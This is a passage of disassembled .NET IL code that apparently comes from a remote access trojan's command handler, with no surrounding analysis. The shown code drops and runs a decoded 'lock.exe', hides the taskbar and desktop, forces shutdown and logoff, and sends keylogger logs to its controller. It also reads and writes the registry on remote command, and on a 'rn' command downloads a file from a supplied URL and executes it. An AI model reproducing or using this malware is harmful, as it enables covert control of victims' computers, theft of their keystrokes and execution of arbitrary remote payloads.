      + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      + "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
      IL_09da:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
      IL_09df:  stloc.s    V_30
      IL_09e1:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_09e6:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
      IL_09eb:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
      IL_09f0:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_Temp()
      IL_09f5:  ldstr      "\\lock.exe"
      IL_09fa:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_09ff:  ldloc.s    V_30
      IL_0a01:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                        uint8[])
      IL_0a06:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0a0b:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
      IL_0a10:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
      IL_0a15:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_Temp()
      IL_0a1a:  ldstr      "\\lock.exe"
      IL_0a1f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0a24:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0a29:  pop
      IL_0a2a:  br         IL_0e38

      IL_0a2f:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0a34:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
      IL_0a39:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_0a3e:  ldstr      "select.dat"
      IL_0a43:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0a48:  ldc.i4.1
      IL_0a49:  callvirt   instance class [mscorlib]System.IO.StreamWriter [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::OpenTextFileWriter(string,
                                                                                                                                                                       bool)
      IL_0a4e:  dup
      IL_0a4f:  ldstr      "002"
      IL_0a54:  callvirt   instance void [mscorlib]System.IO.TextWriter::WriteLine(string)
      IL_0a59:  callvirt   instance void [mscorlib]System.IO.StreamWriter::Close()
      .try
      {
        IL_0a5e:  call       string [mscorlib]System.IO.Path::GetTempPath()
        IL_0a63:  ldstr      "lock.exe"
        IL_0a68:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0a6d:  call       bool [mscorlib]System.IO.File::Exists(string)
        IL_0a72:  brfalse.s  IL_0a88

        IL_0a74:  call       string [mscorlib]System.IO.Path::GetTempPath()
        IL_0a79:  ldstr      "lock.exe"
        IL_0a7e:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0a83:  call       void [mscorlib]System.IO.File::Delete(string)
        IL_0a88:  leave      IL_0e38

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0a8d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0a92:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0a97:  leave      IL_0e38

      }  // end handler
      IL_0a9c:  call       native int j.OK::GetDesktopWindow()
      IL_0aa1:  call       native int j.OK::GetWindowDC(native int)
      IL_0aa6:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0aab:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0ab0:  stloc.s    V_14
      IL_0ab2:  ldloca.s   V_14
      IL_0ab4:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0ab9:  stloc.s    V_32
      IL_0abb:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_0ac0:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0ac5:  stloc.s    V_14
      IL_0ac7:  ldloca.s   V_14
      IL_0ac9:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0ace:  stloc.s    V_33
      IL_0ad0:  newobj     instance void [mscorlib]System.Random::.ctor()
      IL_0ad5:  ldc.i4.0
      IL_0ad6:  ldc.i4     0x1000000
      IL_0adb:  callvirt   instance int32 [mscorlib]System.Random::Next(int32,
                                                                        int32)
      IL_0ae0:  conv.ovf.u4
      IL_0ae1:  call       native int j.OK::CreateSolidBrush(uint32)
      IL_0ae6:  stloc.s    V_34
      IL_0ae8:  dup
      IL_0ae9:  ldloc.s    V_34
      IL_0aeb:  call       native int j.OK::SelectObject(native int,
                                                         native int)
      IL_0af0:  pop
      IL_0af1:  ldc.i4.0
      IL_0af2:  ldc.i4.0
      IL_0af3:  ldloc.s    V_32
      IL_0af5:  ldloc.s    V_33
      IL_0af7:  ldc.i4     0x5a0049
      IL_0afc:  call       bool j.OK::PatBlt(native int,
                                             int32,
                                             int32,
                                             int32,
                                             int32,
                                             valuetype j.OK/TernaryRasterOperations)
      IL_0b01:  pop
      IL_0b02:  ldloc.s    V_34
      IL_0b04:  call       bool j.OK::DeleteObject(native int)
      IL_0b09:  pop
      IL_0b0a:  br         IL_0e38

      IL_0b0f:  ldnull
      IL_0b10:  ldftn      void j.OK::Mouse()
      IL_0b16:  newobj     instance void [mscorlib]System.Threading.ThreadStart::.ctor(object,
                                                                                       native int)
      IL_0b1b:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ThreadStart)
      IL_0b20:  callvirt   instance void [mscorlib]System.Threading.Thread::Start()
      IL_0b25:  br         IL_0e38

      IL_0b2a:  ldstr      "set CDAudio door open"
      IL_0b2f:  ldnull
      IL_0b30:  ldc.i4.0
      IL_0b31:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0b36:  call       int32 j.OK::mciSendString(string,
                                                     string,
                                                     int32,
                                                     native int)
      IL_0b3b:  pop
      IL_0b3c:  br         IL_0e38

      IL_0b41:  ldstr      "set CDAudio door closed"
      IL_0b46:  ldnull
      IL_0b47:  ldc.i4.0
      IL_0b48:  ldsfld     native int [mscorlib]System.IntPtr::Zero
      IL_0b4d:  call       int32 j.OK::mciSendString(string,
                                                     string,
                                                     int32,
                                                     native int)
      IL_0b52:  pop
      IL_0b53:  br         IL_0e38

      IL_0b58:  ldstr      "Shell_TrayWnd"
      IL_0b5d:  ldnull
      IL_0b5e:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_0b63:  ldc.i4.0
      IL_0b64:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_0b69:  pop
      IL_0b6a:  leave      IL_19f4

      IL_0b6f:  ldstr      "Shell_TrayWnd"
      IL_0b74:  ldnull
      IL_0b75:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_0b7a:  ldc.i4.4
      IL_0b7b:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_0b80:  pop
      IL_0b81:  leave      IL_19f4

      IL_0b86:  ldstr      "Progman"
      IL_0b8b:  ldnull
      IL_0b8c:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_0b91:  ldc.i4.0
      IL_0b92:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_0b97:  pop
      IL_0b98:  leave      IL_19f4

      IL_0b9d:  ldstr      "Progman"
      IL_0ba2:  ldnull
      IL_0ba3:  call       native int j.OK::FindWindow(string,
                                                       string)
      IL_0ba8:  ldc.i4.4
      IL_0ba9:  call       bool j.OK::ShowWindow(native int,
                                                 int32)
      IL_0bae:  pop
      IL_0baf:  leave      IL_19f4

      IL_0bb4:  ldc.i4.0
      IL_0bb5:  stloc.s    V_35
      IL_0bb7:  ldc.i4.0
      IL_0bb8:  stloc.s    V_36
      IL_0bba:  ldloc.0
      IL_0bbb:  ldc.i4.1
      IL_0bbc:  ldelem.ref
      IL_0bbd:  stloc.s    V_37
      IL_0bbf:  ldloc.s    V_37
      IL_0bc1:  ldstr      "Error"
      IL_0bc6:  ldc.i4.0
      IL_0bc7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0bcc:  brtrue.s   IL_0bd4

      IL_0bce:  ldc.i4.s   64
      IL_0bd0:  stloc.s    V_36
      IL_0bd2:  br.s       IL_0c11

      IL_0bd4:  ldloc.s    V_37
      IL_0bd6:  ldstr      "Question"
      IL_0bdb:  ldc.i4.0
      IL_0bdc:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0be1:  brtrue.s   IL_0be9

      IL_0be3:  ldc.i4.s   32
      IL_0be5:  stloc.s    V_36
      IL_0be7:  br.s       IL_0c11

      IL_0be9:  ldloc.s    V_37
      IL_0beb:  ldstr      "Warning"
      IL_0bf0:  ldc.i4.0
      IL_0bf1:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0bf6:  brtrue.s   IL_0bfe

      IL_0bf8:  ldc.i4.s   48
      IL_0bfa:  stloc.s    V_36
      IL_0bfc:  br.s       IL_0c11

      IL_0bfe:  ldloc.s    V_37
      IL_0c00:  ldstr      "Info"
      IL_0c05:  ldc.i4.0
      IL_0c06:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0c0b:  brtrue.s   IL_0c11

      IL_0c0d:  ldc.i4.s   16
      IL_0c0f:  stloc.s    V_36
      IL_0c11:  ldloc.0
      IL_0c12:  ldc.i4.2
      IL_0c13:  ldelem.ref
      IL_0c14:  stloc.s    V_38
      IL_0c16:  ldloc.s    V_38
      IL_0c18:  ldstr      "YesNo"
      IL_0c1d:  ldc.i4.0
      IL_0c1e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0c23:  brtrue.s   IL_0c2a

      IL_0c25:  ldc.i4.4
      IL_0c26:  stloc.s    V_35
      IL_0c28:  br.s       IL_0c8c

      IL_0c2a:  ldloc.s    V_38
      IL_0c2c:  ldstr      "YesNoCancel"
      IL_0c31:  ldc.i4.0
      IL_0c32:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0c37:  brtrue.s   IL_0c3e

      IL_0c39:  ldc.i4.3
      IL_0c3a:  stloc.s    V_35
      IL_0c3c:  br.s       IL_0c8c

      IL_0c3e:  ldloc.s    V_38
      IL_0c40:  ldstr      "OK"
      IL_0c45:  ldc.i4.0
      IL_0c46:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0c4b:  brtrue.s   IL_0c52

      IL_0c4d:  ldc.i4.0
      IL_0c4e:  stloc.s    V_35
      IL_0c50:  br.s       IL_0c8c

      IL_0c52:  ldloc.s    V_38
      IL_0c54:  ldstr      "OKCancel"
      IL_0c59:  ldc.i4.0
      IL_0c5a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0c5f:  brtrue.s   IL_0c66

      IL_0c61:  ldc.i4.1
      IL_0c62:  stloc.s    V_35
      IL_0c64:  br.s       IL_0c8c

      IL_0c66:  ldloc.s    V_38
      IL_0c68:  ldstr      "RetryCancel"
      IL_0c6d:  ldc.i4.0
      IL_0c6e:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0c73:  brtrue.s   IL_0c7a

      IL_0c75:  ldc.i4.5
      IL_0c76:  stloc.s    V_35
      IL_0c78:  br.s       IL_0c8c

      IL_0c7a:  ldloc.s    V_38
      IL_0c7c:  ldstr      "AbortRetryCancel"
      IL_0c81:  ldc.i4.0
      IL_0c82:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0c87:  brtrue.s   IL_0c8c

      IL_0c89:  ldc.i4.2
      IL_0c8a:  stloc.s    V_35
      IL_0c8c:  ldloc.0
      IL_0c8d:  ldc.i4.4
      IL_0c8e:  ldelem.ref
      IL_0c8f:  ldloc.0
      IL_0c90:  ldc.i4.3
      IL_0c91:  ldelem.ref
      IL_0c92:  ldloc.s    V_35
      IL_0c94:  ldloc.s    V_36
      IL_0c96:  call       valuetype [System.Windows.Forms]System.Windows.Forms.DialogResult [System.Windows.Forms]System.Windows.Forms.MessageBox::Show(string,
                                                                                                                                                         string,
                                                                                                                                                         valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxButtons,
                                                                                                                                                         valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxIcon)
      IL_0c9b:  pop
      IL_0c9c:  leave      IL_19f4

      IL_0ca1:  ldstr      "SAPI.spvoice"
      IL_0ca6:  ldstr      ""
      IL_0cab:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.Interaction::CreateObject(string,
                                                                                                         string)
      IL_0cb0:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0cb5:  ldnull
      IL_0cb6:  ldstr      "speak"
      IL_0cbb:  ldc.i4.1
      IL_0cbc:  newarr     [mscorlib]System.Object
      IL_0cc1:  dup
      IL_0cc2:  ldc.i4.0
      IL_0cc3:  ldc.i4.1
      IL_0cc4:  newarr     [mscorlib]System.String
      IL_0cc9:  dup
      IL_0cca:  ldc.i4.0
      IL_0ccb:  ldloc.0
      IL_0ccc:  ldc.i4.1
      IL_0ccd:  ldelem.ref
      IL_0cce:  stelem.ref
      IL_0ccf:  call       string [mscorlib]System.String::Concat(string[])
      IL_0cd4:  stelem.ref
      IL_0cd5:  ldnull
      IL_0cd6:  ldnull
      IL_0cd7:  ldnull
      IL_0cd8:  ldc.i4.1
      IL_0cd9:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0cde:  pop
      IL_0cdf:  leave      IL_19f4

      IL_0ce4:  ldstr      "fun"
      IL_0ce9:  call       bool j.OK::Send(string)
      IL_0cee:  pop
      IL_0cef:  leave      IL_19f4

      IL_0cf4:  ldc.i4.1
      IL_0cf5:  newarr     [mscorlib]System.String
      IL_0cfa:  dup
      IL_0cfb:  ldc.i4.0
      IL_0cfc:  ldloc.0
      IL_0cfd:  ldc.i4.1
      IL_0cfe:  ldelem.ref
      IL_0cff:  stelem.ref
      IL_0d00:  call       string [mscorlib]System.String::Concat(string[])
      IL_0d05:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0d0a:  ldstr      "300"
      IL_0d0f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0d14:  call       void j.OK::Beep(int32,
                                           int32)
      IL_0d19:  leave      IL_19f4

      IL_0d1e:  ldstr      "Shutdown"
      IL_0d23:  ldstr      "/s /t 00"
      IL_0d28:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                              string)
      IL_0d2d:  pop
      IL_0d2e:  leave      IL_19f4

      IL_0d33:  ldstr      "Shutdown"
      IL_0d38:  ldstr      "/r /t 00"
      IL_0d3d:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                              string)
      IL_0d42:  pop
      IL_0d43:  leave      IL_19f4

      IL_0d48:  ldstr      "Shutdown"
      IL_0d4d:  ldstr      "/l /f"
      IL_0d52:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                              string)
      IL_0d57:  pop
      IL_0d58:  leave      IL_19f4

      IL_0d5d:  call       void BotKillers::RunStandardBotKiller()
      IL_0d62:  br         IL_0e38

      IL_0d67:  ldc.i4.0
      IL_0d68:  stsfld     bool j.OK::Cn
      IL_0d6d:  leave      IL_19f4

      IL_0d72:  ldstr      "kl"
      IL_0d77:  ldsfld     string j.OK::Y
      IL_0d7c:  ldsfld     class j.kl j.OK::kq
      IL_0d81:  ldflda     string j.kl::Logs
      IL_0d86:  call       string j.OK::ENB(string&)
      IL_0d8b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0d90:  call       bool j.OK::Send(string)
      IL_0d95:  pop
      IL_0d96:  leave      IL_19f4

      IL_0d9b:  ldloc.0
      IL_0d9c:  ldc.i4.1
      IL_0d9d:  ldelem.ref
      IL_0d9e:  stloc.s    V_39
      IL_0da0:  ldloc.s    V_39
      IL_0da2:  ldstr      "~"
      IL_0da7:  ldc.i4.0
      IL_0da8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0dad:  brfalse.s  IL_0dcf

      IL_0daf:  ldloc.s    V_39
      IL_0db1:  ldstr      "!"
      IL_0db6:  ldc.i4.0
      IL_0db7:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0dbc:  brfalse.s  IL_0dde

      IL_0dbe:  ldloc.s    V_39
      IL_0dc0:  ldstr      "@"
      IL_0dc5:  ldc.i4.0
      IL_0dc6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0dcb:  brfalse.s  IL_0e2b

      IL_0dcd:  br.s       IL_0e33

      IL_0dcf:  ldloc.0
      IL_0dd0:  ldc.i4.2
      IL_0dd1:  ldelem.ref
      IL_0dd2:  ldloc.0
      IL_0dd3:  ldc.i4.3
      IL_0dd4:  ldelem.ref
      IL_0dd5:  ldc.i4.1
      IL_0dd6:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0ddb:  pop
      IL_0ddc:  br.s       IL_0e33

      IL_0dde:  ldloc.0
      IL_0ddf:  ldc.i4.2
      IL_0de0:  ldelem.ref
      IL_0de1:  ldloc.0
      IL_0de2:  ldc.i4.3
      IL_0de3:  ldelem.ref
      IL_0de4:  ldc.i4.1
      IL_0de5:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0dea:  pop
      IL_0deb:  ldstr      "getvalue"
      IL_0df0:  ldsfld     string j.OK::Y
      IL_0df5:  ldloc.0
      IL_0df6:  ldc.i4.1
      IL_0df7:  ldelem.ref
      IL_0df8:  ldsfld     string j.OK::Y
      IL_0dfd:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0e02:  ldloc.0
      IL_0e03:  ldc.i4.1
      IL_0e04:  ldelem.ref
      IL_0e05:  ldstr      ""
      IL_0e0a:  call       object j.OK::GTV(string,
                                            object)
      IL_0e0f:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0e14:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                             object)
      IL_0e19:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0e1e:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_0e23:  call       bool j.OK::Send(string)
      IL_0e28:  pop
      IL_0e29:  br.s       IL_0e33

      IL_0e2b:  ldloc.0
      IL_0e2c:  ldc.i4.2
      IL_0e2d:  ldelem.ref
      IL_0e2e:  call       void j.OK::DLV(string)
      IL_0e33:  leave      IL_19f4

      IL_0e38:  ldloc.2
      IL_0e39:  ldstr      "rn"
      IL_0e3e:  ldc.i4.0
      IL_0e3f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0e44:  brtrue     IL_0ff1

      IL_0e49:  ldloc.0
      IL_0e4a:  ldc.i4.2
      IL_0e4b:  ldelem.ref
      IL_0e4c:  ldc.i4.0
      IL_0e4d:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_0e52:  ldc.i4.s   31
      IL_0e54:  bne.un     IL_0edc

      .try
      {
        IL_0e59:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0e5e:  ldloc.0
        IL_0e5f:  ldc.i4.0
        IL_0e60:  ldelem.ref
        IL_0e61:  ldsfld     string j.OK::Y
        IL_0e66:  ldloc.0
        IL_0e67:  ldc.i4.1
        IL_0e68:  ldelem.ref
        IL_0e69:  ldsfld     string j.OK::Y
        IL_0e6e:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0e73:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0e78:  stloc.s    V_40
        IL_0e7a:  dup
        IL_0e7b:  ldarg.0
        IL_0e7c:  ldloc.s    V_40
        IL_0e7e:  ldarg.0
        IL_0e7f:  ldlen
        IL_0e80:  conv.i4
        IL_0e81:  ldloc.s    V_40
        IL_0e83:  sub.ovf
        IL_0e84:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0e89:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0e8e:  call       uint8[] j.OK::ZIP(uint8[])
        IL_0e93:  stloc.1
        IL_0e94:  leave      IL_0f31

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0e99:  dup
        IL_0e9a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0e9f:  stloc.s    V_41
        IL_0ea1:  ldloc.s    V_41
        IL_0ea3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0ea8:  ldstr      "MSG"
        IL_0ead:  ldsfld     string j.OK::Y
        IL_0eb2:  ldstr      "Execute ERROR"
        IL_0eb7:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0ebc:  call       bool j.OK::Send(string)
        IL_0ec1:  pop
        IL_0ec2:  ldstr      "bla"
        IL_0ec7:  call       bool j.OK::Send(string)
        IL_0ecc:  pop
        IL_0ecd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0ed2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0ed7:  leave      IL_19f4

      }  // end handler
      IL_0edc:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_0ee1:  stloc.3
      .try
      {
        IL_0ee2:  ldloc.3
        IL_0ee3:  ldloc.0
        IL_0ee4:  ldc.i4.2
        IL_0ee5:  ldelem.ref
        IL_0ee6:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_0eeb:  stloc.1
        IL_0eec:  leave.s    IL_0f31

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0eee:  dup
        IL_0eef:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0ef4:  stloc.s    V_42
        IL_0ef6:  ldloc.s    V_42
        IL_0ef8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0efd:  ldstr      "MSG"
        IL_0f02:  ldsfld     string j.OK::Y
        IL_0f07:  ldstr      "Download ERROR"
        IL_0f0c:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0f11:  call       bool j.OK::Send(string)
        IL_0f16:  pop
        IL_0f17:  ldstr      "bla"
        IL_0f1c:  call       bool j.OK::Send(string)
        IL_0f21:  pop
        IL_0f22:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0f27:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0f2c:  leave      IL_19f4

      }  // end handler
      IL_0f31:  ldstr      "bla"
      IL_0f36:  call       bool j.OK::Send(string)
      IL_0f3b:  pop
      IL_0f3c:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_0f41:  call       valuetype [mscorlib]System.Guid [mscorlib]System.Guid::NewGuid()
      IL_0f46:  stloc.s    V_31
      IL_0f48:  ldloca.s   V_31
      IL_0f4a:  constrained. [mscorlib]System.Guid
      IL_0f50:  callvirt   instance string [mscorlib]System.Object::ToString()
      IL_0f55:  ldstr      "-"
      IL_0f5a:  ldstr      ""
      IL_0f5f:  callvirt   instance string [mscorlib]System.String::Replace(string,
                                                                            string)
      IL_0f64:  ldstr      "."
      IL_0f69:  ldloc.0
      IL_0f6a:  ldc.i4.1
      IL_0f6b:  ldelem.ref
      IL_0f6c:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0f71:  stloc.s    V_4
      .try
      {
        IL_0f73:  ldloc.s    V_4
        IL_0f75:  ldloc.1
        IL_0f76:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_0f7b:  ldloc.s    V_4
        IL_0f7d:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
        IL_0f82:  pop
        IL_0f83:  ldstr      "MSG"
        IL_0f88:  ldsfld     string j.OK::Y
        IL_0f8d:  ldstr      "Executed As "
        IL_0f92:  ldloc.s    V_4
        IL_0f94:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_0f99:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_0f9e:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0fa3:  call       bool j.OK::Send(string)
        IL_0fa8:  pop
        IL_0fa9:  leave      IL_19f4

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0fae:  dup
        IL_0faf:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0fb4:  stloc.s    V_43
        IL_0fb6:  ldloc.s    V_43
        IL_0fb8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0fbd:  ldloc.s    V_43
        IL_0fbf:  stloc.s    V_44
        IL_0fc1:  ldstr      "MSG"
        IL_0fc6:  ldsfld     string j.OK::Y
        IL_0fcb:  ldstr      "Execute ERROR "
        IL_0fd0:  ldloc.s    V_44
        IL_0fd2:  callvirt   instance string [mscorlib]System.Exception::get_Message()
        IL_0fd7:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0fdc:  call       bool j.OK::Send(string)
        IL_0fe1:  pop
        IL_0fe2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0fe7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0fec:  leave      IL_19f4

      }  // end handler
      IL_0ff1:  ldloc.2
      IL_0ff2:  ldstr      "inv"
      IL_0ff7:  ldc.i4.0
      IL_0ff8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
